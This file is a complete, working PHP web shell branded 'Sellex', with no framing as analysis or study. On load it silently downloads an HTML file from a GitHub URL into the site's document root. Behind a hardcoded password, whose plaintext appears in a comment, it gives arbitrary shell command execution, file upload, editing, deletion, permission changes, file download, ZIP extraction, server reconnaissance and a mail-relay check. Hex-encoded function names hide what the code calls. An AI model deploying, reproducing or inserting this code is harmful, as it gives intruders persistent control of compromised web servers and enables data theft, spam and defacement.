<?php

$filenameseo = $_SERVER['DOCUMENT_ROOT'].'/sellex.html';

if (file_exists($filenameseo)) {
} else {
	$url = "https://raw.githubusercontent.com/payp613/sellex/main/sellex.html";
	$im = curl_init($url);
	curl_setopt($im, CURLOPT_RETURNTRANSFER, 1);
	curl_setopt($im, CURLOPT_CONNECTTIMEOUT, 10);
	curl_setopt($im, CURLOPT_FOLLOWLOCATION, 1);
	curl_setopt($im, CURLOPT_HEADER, 0);
	$text1 = curl_exec($im);
	curl_close($im);
	$open1 = fopen($_SERVER['DOCUMENT_ROOT'].'/sellex.html', 'w');
	fwrite($open1, $text1);
	fclose($open1);
}

@session_start();
$session_name = md5("1x5sa5hakA654asrKJAGSRKMJHjhas");
$password = "4cfb8bed080144c335b03ba2e493f3e9"; // mangsut#123
if ( !isset($_SESSION[$session_name]) ||($_SESSION[$session_name] != "OK") ) {
	if(isset($_GET['pass'])){
		$getpass = md5($_GET['pass']);
		if($getpass == $password){
			$_SESSION[$session_name] = "OK";
			shell();
		}
	}else if(isset($_POST['pass'])){
		$getpass = md5($_POST['pass']);
		if($getpass == $password){
			$_SESSION[$session_name] = "OK";
			shell();
		}
	}
	echo '<pre align="center"><form method="post">Password: <input type="password" name="pass"><input type="submit" value=">>"></form></pre>';
}else{
	shell();
}

function shell(){
function hex($str) {
	$r = "";
	for ($i = 0; $i < strlen($str); $i++) {
		$r .= dechex(ord($str[$i]));
	}
	return $r;
}
function nhx($str) {
	$r = "";
	$len = (strlen($str) -1);
	for ($i = 0; $i < $len; $i += 2) {
		$r .= chr(hexdec($str[$i].$str[$i+1]));
	}
	return $r;
}
if (isset($_GET["download"])) {
	function _dwn($pfile){
		$exp = explode('/',$pfile);
		$ppx = nhx($exp[0]) . '/' . nhx($exp[1]);
		if(file_exists($ppx))
		{
			$type = mime_content_type($ppx);
			header("Content-Type: application/octet-stream");
			header('Content-Description: File Transfer');
			header("Content-Length: ".filesize($ppx));
			header('Content-Disposition: attachment; filename="'.basename($ppx).'"');
			readfile($ppx);
		}
	
	}
	_dwn($_REQUEST['p'].'/'.$_REQUEST['n']);

}
else{

if(isset($_GET['p']))
{
	$arr_pl = preg_replace("/".hex($_SERVER['DOCUMENT_ROOT'])."/i","",$_GET['p']);
}

if(isset($_GET['check'])){
	die("working");
}if(isset($_GET['checksend'])){
	$characters = '0123456789abcdefghijklmnopqrstuvwxyz';
	$charactersLength = strlen($characters);
	$randomString = '';
	for ($i = 0; $i < 30; $i++) {
		$randomString .= $characters[rand(0, $charactersLength - 1)];
	}
	if(@mail($randomString.'@'.$randomString.'.com', "Hello", "Hello, dear user!")){
	  die("check-result-1");
	}else{
	  die("check-result-0");
	}
}if(isset($_GET['checkzip'])){
	$filezip = 'checker_zip_file.zip';
	$filetxt = 'checker_zip_file.txt';
	$zip = new ZipArchive;
	if ($zip->open($filezip, ZipArchive::CREATE) === TRUE){
		$zip->addFromString($filetxt, 'test');
		$zip->close();
		$zip = new ZipArchive;
		$zip->open($filezip);
		$zip->extractTo(getcwd());
		$zip->close();
		@system("unzip ".$filezip);
		@shell_exec("unzip ".$filezip);
		@passthru("unzip ".$filezip);
		if(file_exists($filetxt)){
			@unlink($filezip);
			@unlink($filetxt);
			die("check-result-1");
		}else{
			@unlink($filezip);
			@unlink($filetxt);
			die("check-result-0");
		}
	}else{
		die("check-result-0");
	}
}
define("self", "sellex.pw");
$scD = "s\x63\x61\x6e\x64\x69r";
$fc = array("7068705f756e616d65", "70687076657273696f6e", "676574637764", "6368646972", "707265675f73706c6974", "61727261795f64696666", "69735f646972", "69735f66696c65", "69735f7772697461626c65", "69735f7265616461626c65", "66696c6573697a65", "636f7079", "66696c655f657869737473", "66696c655f7075745f636f6e74656e7473", "66696c655f6765745f636f6e74656e7473", "6d6b646972", "72656e616d65", "737472746f74696d65", "68746d6c7370656369616c6368617273", "64617465", "66696c656d74696d65");
for ($i = 0; $i < count($fc); $i++) {
	$fc[$i] = nhx($fc[$i]);
}
if (isset($_GET["p"])) {
	$p = nhx($_GET["p"]);
	$fc[3](nhx($_GET["p"]));
} else {
	$p = $fc[2]();
}

function perms($f) {
	$p = fileperms($f);
	if (($p & 0xC000) == 0xC000) {
		$i = 's';
	} elseif (($p & 0xA000) == 0xA000) {
		$i = 'l';
	} elseif (($p & 0x8000) == 0x8000) {
		$i = '-';
	} elseif (($p & 0x6000) == 0x6000) {
		$i = 'b';
	} elseif (($p & 0x4000) == 0x4000) {
		$i = 'd';
	} elseif (($p & 0x2000) == 0x2000) {
		$i = 'c';
	} elseif (($p & 0x1000) == 0x1000) {
		$i = 'p';
	} else {
		$i = 'u';
	}
	$i .= (($p & 0x0100) ? 'r' : '-');
	$i .= (($p & 0x0080) ? 'w' : '-');
	$i .= (($p & 0x0040) ? (($p & 0x0800) ? 's' : 'x') : (($p & 0x0800) ? 'S' : '-'));
	$i .= (($p & 0x0020) ? 'r' : '-');
	$i .= (($p & 0x0010) ? 'w' : '-');
	$i .= (($p & 0x0008) ? (($p & 0x0400) ? 's' : 'x') : (($p & 0x0400) ? 'S' : '-'));
	$i .= (($p & 0x0004) ? 'r' : '-');
	$i .= (($p & 0x0002) ? 'w' : '-');
	$i .= (($p & 0x0001) ? (($p & 0x0200) ? 't' : 'x') : (($p & 0x0200) ? 'T' : '-'));
	return $i;
}
function a($msg, $sts = 1, $loc = "") {
	global $p;
	$status = (($sts == 1) ? "success" : "error");
	echo "<script>swal({title: \"{$status}\", text: \"{$msg}\", icon: \"{$status}\"}).then((btnClick) => {if(btnClick){document.location.href=\"?p=".hex($p).$loc."\"}})</script>";
}
function deldir($d) {
	global $fc;
	if (trim(pathinfo($d, PATHINFO_BASENAME), '.') === '') return;
	if ($fc[6]($d)) {
		array_map("deldir", glob($d . DIRECTORY_SEPARATOR . '{,.}*', GLOB_BRACE | GLOB_NOSORT));
		rmdir($d);
	} else {
		unlink($d);
	}
}
function getSec(){
	$sfmd = ini_get('safe_mode');
	if(!$sfmd){
		return "OFF";
	}else{
		return "ON";
	}
}
function getCurls(){
	
	if(function_exists('curl_version')){
		return "ON";
	}else{
		return "OFF";
	}
}
function getMySQL(){
	if(function_exists('mysql_connect')){
		return "ON";
	}else{
		return "OFF";
	}
}
function getDis(){
	$vars = ini_get('disable_functions');
	if($vars===null || $vars==="")
	{
		return "NONE";
	}else{
		return $vars;
	}
}

function chgPerm($loc,$code){
	$def = 0;
	for($i=strlen($code)-1;$i>=0;--$i)
		$def += (int)$code[$i]*pow(8, (strlen($code)-$i-1));
	if(is_dir($loc) || is_file($loc)){
		if(chmod($loc,$def)){
			a("Permission for ".$loc."\\nChanged to -> ".$code);
		}
	}
}
?>
<!doctype html>
<html lang="en"><head><meta name="theme-color" content="red"><meta name="viewport" content="width=device-width, initial-scale=0.60, shrink-to-fit=no"><link rel="stylesheet" href="//cdn.jsdelivr.net/npm/bootstrap@4.6.0/dist/css/bootstrap.min.css"><link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css"><title><?= self ?></title><style>.table-hover tbody tr:hover td{background:red}.table-hover tbody tr:hover td>*{color:#fff}.table>tbody>tr>*{color:#fff;vertical-align:middle}.form-control{background:0 0!important;color:#fff!important;border-radius:0}.form-control::placeholder{color:#fff;opacity:1}li{font-size:18px;margin-left:6px;list-style:none}a{color:#fff}</style><script src="//unpkg.com/sweetalert/dist/sweetalert.min.js"></script></head><body style="background-color:#000;color:#fff;font-family:serif;"><div class="bg-dark table-responsive text-light border"><div><h3 class="mt-2"><center><b><a href="?"><?= self ?></a></b></center></h3></div><div class="border-top table-responsive">
<li>Uname : <nobr><?php echo substr(@php_uname(),0,120); ?></nobr></li>
<li>Server Software : <nobr><?php echo $_SERVER['SERVER_SOFTWARE']; ?></nobr></li>
<li>Server IP : <nobr><?php echo $_SERVER['SERVER_ADDR']; ?></nobr> | Your IP : <nobr><?php echo $_SERVER['REMOTE_ADDR']; ?></nobr></li>
<li>Safemode : <nobr><?php echo getSec(); ?></nobr></li>
<li>PHP Version : <nobr><?php echo substr(@phpversion(),0,20); ?></nobr></li>
<li>User : <nobr><?php echo get_current_user(); ?></nobr> | Server Admin : <?php echo $_SERVER['SERVER_ADMIN']; ?></nobr></li>
<li>Disabled functions : <nobr><?php echo getDis(); ?></nobr> | cURL : <?php echo getCurls(); ?> | MySQL : <?php echo getMySQL(); ?></li>
</div><form method="post" enctype="multipart/form-data"><div class="input-group mb-1 px-1 mt-1"><div class="custom-file"><input type="file" name="f[]" class="custom-file-input" onchange="this.form.submit()" multiple><label class="custom-file-label rounded-0 bg-transparent text-light">Choose file</label></div></div></form>
Full Server Info
<form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
<input type="submit" name="info" value="INFO">
</form>
<?php 

if(isset($_REQUEST['info']))
{ 
	phpinfo();
	die;
}
if (isset($_FILES["f"])) {
	$n = $_FILES["f"]["name"];
	for ($i = 0; $i < count($n); $i++) {
		if ($fc[11]($_FILES["f"]["tmp_name"][$i], $n[$i])) {
			$link = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? "https" : "http") . "://".$_SERVER['HTTP_HOST'].nhx($arr_pl)."/".$_FILES["f"]["name"][$i];
			a("file uploaded successfully!\\n".$link);
		} else {
			a("file failed to upload", 0);
		}
	}
}
if(isset($_GET['chmodd'])){
	?><center>
	<form action="" method="POST">
		<label>Directory : <?php echo nhx($_GET['d']);?></label><br>
		<input type="hidden" name="cgf" value="<?php echo nhx($_GET['p']).'/'.nhx($_GET['d']);?>">
		<input type="text" name="codex" placeholder="<?php echo substr(sprintf("%o", fileperms(nhx($_GET['p']).'/'.nhx($_GET['d']))),-4); ?>"><br>
		<input type="submit" value="chmod">
	</form></center>
	<?php
	if(isset($_POST['cgf']) && isset($_POST['codex'])){
		if(is_dir(nhx($_GET['p']).'/'.nhx($_GET['d']))){
			chgPerm($_POST['cgf'],$_POST['codex']);
		}
	}
}
if(isset($_GET['chmodf'])){
	?><center>
	<form action="" method="POST">
		<label>Filename : <?php echo nhx($_GET['n']);?></label><br>
		<input type="hidden" name="cgf" value="<?php echo nhx($_GET['p']).'/'.nhx($_GET['n']);?>">
		<input type="text" name="codex" placeholder="<?php echo substr(sprintf("%o", fileperms(nhx($_GET['p']).'/'.nhx($_GET['n']))),-4); ?>"><br>
		<input type="submit" value="chmod">
	</form></center>
	<?php
	if(isset($_POST['cgf']) && isset($_POST['codex'])){
		if(file_exists(nhx($_GET['p']).'/'.nhx($_GET['n']))){
			chgPerm($_POST['cgf'],$_POST['codex']);
		}
	}
}
?>
</div><div class="bg-dark border table-responsive mt-2"><div class="ml-2" style="font-size:18px;"><span>Current Path: </span>
<?php
$ps = $fc[4]("/(\\\|\/)/", $p);
foreach ($ps as $k => $v) {
	if ($k == 0 && $v == "") {
		echo "<a href=\"?p=2f\">~</a>/"; continue;
	}
	if ($v == "") continue;
	echo "<a href=\"?p=";
	for ($i = 0; $i <= $k; $i++) {
		echo hex($ps[$i]);
		if ($i != $k) echo "2f";
	}
	echo "\">{$v}</a>/";
}
?>
<br>
<span>Document Root : <?php print($_SERVER['DOCUMENT_ROOT']);?></span>
</div></div><span>File manager</span><article class="bg-dark border table-responsive mt-2">
<?php if (!isset($_GET["a"])): ?>
<table class="table table-hover table-borderless table-sm"><thead class="text-light"><tr><th>Name</th><th>Size</th><th>Permission</th><th>Action</th></tr></thead><tbody class="text-light">
<?php
$scD = $fc[5]($scD($p), [".", ".."]);
foreach ($scD as $d) {
	if (!$fc[6]("$p/$d")) continue;
	echo "<tr><td><a href=\"?p=".hex("$p/$d")."\" data-toggle=\"tooltip\" data-placement=\"auto\" title=\"Latest modify on ".$fc[19]("Y-m-d H:i", $fc[20]("$p/$d"))."\"><i class=\"fa fa-fw fa-folder\"></i> {$d}</a></td><td>N/A</td><td><a href='?p=".hex($p)."&d=".hex($d)."&chmodd=1'><font color=\"".(($fc[8]("$p/$d")) ? "#00ff00" : (!$fc[9]("$p/$d") ? "red" : null))."\">".perms("$p/$d")."</font></a></td><td><a href=\"?p=".hex($p)."&a=".hex("rename")."&n=".hex($d)."&t=d\" data-toggle=\"tooltip\" data-placement=\"auto\" title=\"Rename\"><i class=\"fa fa-fw fa-pencil\"></i></a><a href=\"?p=".hex($p)."&a=".hex("delete")."&n=".hex($d)."\" class=\"delete\" data-type=\"folder\" data-toggle=\"tooltip\" data-placement=\"auto\" title=\"Delete\"><i class=\"fa fa-fw fa-trash\"></i></a></td></tr>";
}
foreach ($scD as $f) {
	if (!$fc[7]("$p/$f")) continue;
	$sz = $fc[10]("$p/$f")/1024;
	$sz = round($sz, 3);
	$sz = ($sz > 1024) ? round($sz/1024, 2)."MB" : $sz."KB";
	echo "<tr><td><a href=\"?p=".hex($p)."&a=".hex("view")."&n=".hex($f)."\" data-toggle=\"tooltip\" data-placement=\"auto\" title=\"Latest modify on ".$fc[19]("Y-m-d H:i", $fc[20]("$p/$f"))."\"><i class=\"fa fa-fw fa-file\"></i> {$f}</a></td><td>{$sz}</td><td><a href='?p=".hex($p)."&n=".hex($f)."&chmodf=1'><font color=\"".(($fc[8]("$p/$f")) ? "#00ff00" : (!$fc[9]("$p/$f") ? "red" : null))."\">".perms("$p/$f")."</font></a></td><td><div class=\"d-flex justify-content-between\"><a href=\"?p=".hex($p)."&a=".hex("edit")."&n=".hex($f)."\" data-toggle=\"tooltip\" data-placement=\"auto\" title=\"Edit\"><i class=\"fa fa-fw fa-edit\"></i></a><a href=\"?p=".hex($p)."&a=".hex("rename")."&n=".hex($f)."&t=f\" data-toggle=\"tooltip\" data-placement=\"auto\" title=\"Rename\"><i class=\"fa fa-fw fa-pencil\"></i></a><a href=\"?p=".hex($p)."&n=".hex($f)."&download"."\" data-toggle=\"tooltip\" data-placement=\"auto\" title=\"Download\"><i class=\"fa fa-fw fa-download\"></i></a><a href=\"?p=".hex($p)."&a=".hex("delete")."&n=".hex($f)."\" class=\"delete\" data-type=\"file\" data-toggle=\"tooltip\" data-placement=\"auto\" title=\"Delete\"><i class=\"fa fa-fw fa-trash\"></i></a></div></td></tr>";
}
?></tbody></table>
<?php else :if (isset($_GET["a"])) $a = nhx($_GET["a"]); ?>
<div class="px-2 py-2">
<?php if ($a == "delete") {
	$loc = $p.'/'.nhx($_GET["n"]);
	if ($_GET["t"] == "d") {
		deldir($loc);
		if (!$fc[12]($loc)) {
			a("folder deleted successfully");
		} else {
			a("failed to delete the folder", 0);
		}
	}
	if ($_GET["t"] == "f") {
		$loc = $p.'/'.nhx($_GET["n"]);
		unlink($loc);
		if (!$fc[12]($loc)) {
			a("file deleted successfully");
		} else {
			a("file to delete the folder", 0);
		}
	}
}
?>
<?php if ($a == "newDir"): ?>
<h5 class="border p-1 mb-3">New folder</h5>
<form method="post"><div class="form-group"><label for="n">Name :</label><input name="n" id="n" class="form-control" autocomplete="off"></div><div class="form-group"><button type="submit" name="s" class="btn btn-outline-light rounded-0">Create</button></div></form>
<?php ((isset($_POST["s"])) ? ($fc[12]("$p/{$_POST["n"]}") ? a("folder name has been used", 0, "&a=".hex("newDir")) : ($fc[15]("$p/{$_POST["n"]}") ? a("folder created successfully") : a("folder failed to create", 0))) : null); elseif ($a == "newFile"): ?>
<h5 class="border p-1 mb-3">New file</h5>
<form method="post"><div class="form-group"><label for="n">File name :</label><input type="text" name="n" id="n" class="form-control" placeholder="hack.txt"></div><div class="form-group"><label for="ctn">Content :</label><textarea style="resize:none" name="ctn" id="ctn" cols="30" rows="10" class="form-control" placeholder="# Stamped By Me"></textarea></div><div class="form-group"><button type="submit" name="s" class="btn btn-outline-light rounded-0">Create</button></div></form>
<?php ((isset($_POST["s"])) ? ($fc[12]("$p/{$_POST["n"]}") ? a("file name has been used", 0, "&a=".hex("newFile")) : ($fc[13]("$p/{$_POST["n"]}", $_POST["ctn"]) ? a("file created successfully",1,"&a=".hex("view")."&n=".hex($_POST["n"])) : a("file failed to create", 0))) : null); elseif ($a == "rename"): ?>
<h5 class="border p-1 mb-3">Rename <?= (($_GET["t"] == "d") ? "folder" : "file") ?></h5>
<form method="post"><div class="form-group"><label for="n">Name :</label><input type="text" name="n" id="n" class="form-control" value="<?= nhx($_GET["n"]) ?>"></div><div class="form-group"><button type="submit" name="s" class="btn btn-outline-light rounded-0">Save</button></div></form>
<?php ((isset($_POST["s"])) ? ($fc[16]($p.'/'.nhx($_GET["n"]), $_POST["n"]) ? a("successfully changed the folder name") : a("failed to change the folder name", 0)) : null); elseif ($a == "edit"): ?>
<h5 class="border p-1 mb-3">Edit file</h5>
<span>File name : <?= nhx($_GET["n"]) ?></span>
<form method="post"><div class="form-group"><label for="ctn">Content :</label><textarea name="ctn" id="ctn" cols="30" rows="10" class="form-control"><?= $fc[18]($fc[14]($p.'/'.nhx($_GET["n"]))) ?></textarea></div><div class="form-group"><button type="submit" name="s" class="btn btn-outline-light rounded-0">Save</button></div></form>
<?php ((isset($_POST["s"])) ? ($fc[13]($p.'/'.nhx($_GET["n"]), $_POST["ctn"]) ? a("file contents changed successfully", 1, "&a=".hex("view")."&n={$_GET["n"]}") : a("file contents failed to change")) : null); elseif ($a == "view"): ?>
<h5 class="border p-1 mb-3">View file</h5>
<span>File name : <?= nhx($_GET["n"]) ?></span>
<div class="form-group"><label for="ctn">Content :</label><textarea name="ctn" id="ctn" cols="30" rows="10" class="form-control" readonly><?= $fc[18]($fc[14]($p.'/'.nhx($_GET["n"]))) ?></textarea></div><?php endif; ?></div><?php endif; ?></article>
<div class="bg-dark border table-responsive mt-2">
<?php
if(isset($_POST['execmd'])){
	if( strpos(ini_get("disable_functions"), "shell_exec") !== 0 ) {
		$xev = shell_exec($_POST['execmd']); 
		echo "<code><pre style='color:#fff;'>$xev</pre></code>";
	}else if( strpos(ini_get("disable_functions"), "passthru") !== 0 ) {
		$xev = passthru($_POST['execmd']); 
		echo "<code><pre style='color:#fff;'>$xev</pre></code>";
	}else{
		$xev = system($_POST['execmd']); 
		echo "<code><pre style='color:#fff;'>$xev</pre></code>";
	}
} 
?>
</div>
<div class="bg-dark border text-center mt-2">
	<center>
<table>
	<form action="" method="POST">
		<tr><td><label>New Folder : </label></td>
		<td><input type="text" name="makedir"/></td>
		<td><input type="submit" name="submit" value=">>"/></td>
		</tr>
		<?php 
		if(isset($_POST['makedir'])){ 
			if(!is_dir($_POST['makedir'])){
				if(mkdir(basename($_POST['makedir']))){
					a("Folder ".basename($_POST['makedir'])." created!");
				}
				} 
			} ?>
	</form>
	<form action="" method="POST">
		<tr><td><label>New File : </label></td>
		<td><input type="text" name="makefile"/></td>
		<td><input type="submit" name="submit" value=">>"/></td>
		</tr>
		<?php 
		if(isset($_POST['makefile']))
		{
			if(isset($_GET['p']))
			{
				$xfl = fopen(basename(nhx($_GET['p'])."/".$_POST['makefile']),'w') or die(a("Failed to create file!",0));
				fwrite($xfl,'');
				fclose($xfl);
				a("File created!");
			}
			else
			{
				$xfl = fopen(basename($_POST['makefile']),'w') or die(a("Failed to create file!",0));
				fwrite($xfl,'');
				fclose($xfl);
				a("File created!");
			}
			 
		}
	  ?>
	</form>
	<form action="" method="POST">
		<tr><td><label>Execute : </label></td>
		<td><input type="text" name="execmd"/></td>
		<td><input type="submit" name="submit" value=">>"/></td>
		</tr>
	</form>
	<form action="" method="POST">
		<tr><td><label>Extract ZIP : </label></td>
		<td><input type="text" name="zipfile"/></td>
		<td><input type="submit" name="submit" value=">>"/></td>
		</tr>
		<?php 
		if(isset($_POST['zipfile'])){
			
			$xfl = $_POST['zipfile'];
			
			$zip = new ZipArchive;
			$res = $zip->open($xfl);
			if ($res === TRUE) {
			  $zip->extractTo(getcwd());
			  $zip->close();
			  a("ZIP File Extracted!");
			} else {
			  a("Failed to extract ZIP File!", 0);
			}
			
			
			 
		}
	  ?>
	</form>
</table></center>
</div>
<div class="bg-dark border text-center mt-2"><h4>  Powered By <a href="https://sellex.pw">Sellex.pw</a>  </h4></div><script src="//code.jquery.com/jquery-3.5.1.slim.min.js"></script><script src="//cdn.jsdelivr.net/npm/bootstrap@4.6.0/dist/js/bootstrap.bundle.min.js" ></script><script src="//cdn.jsdelivr.net/npm/bs-custom-file-input/dist/bs-custom-file-input.min.js"></script><script>eval(function(p,a,c,k,e,d){e=function(c){return(c<a?'':e(parseInt(c/a)))+((c=c%a)>35?String.fromCharCode(c+29):c.toString(36))};if(!''.replace(/^/,String)){while(c--){d[e(c)]=k[c]||e(c)}k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c])}}return p}('E.n();$(\'[2-m="4"]\').4();$(".l").k(j(e){e.g();h 0=$(6).5("2-0");c({b:"a",9:"o i q?",w:"D "+0+" p C B",A:7,z:7,}).y((8)=>{r(8){x 1=$(6).5("3")+"&t="+((0=="v")?"d":"f");u.s.3=1}})});',41,41,'type|buildURL|data|href|tooltip|attr|this|true|willDelete|title|warning|icon|swal||||preventDefault|let|you|function|click|delete|toggle|init|Are|will|sure|if|location||document|folder|text|const|then|dangerMode|buttons|deleted|be|This|bsCustomFileInput'.split('|'),0,{}))</script></body></html>
<?php }} ?>
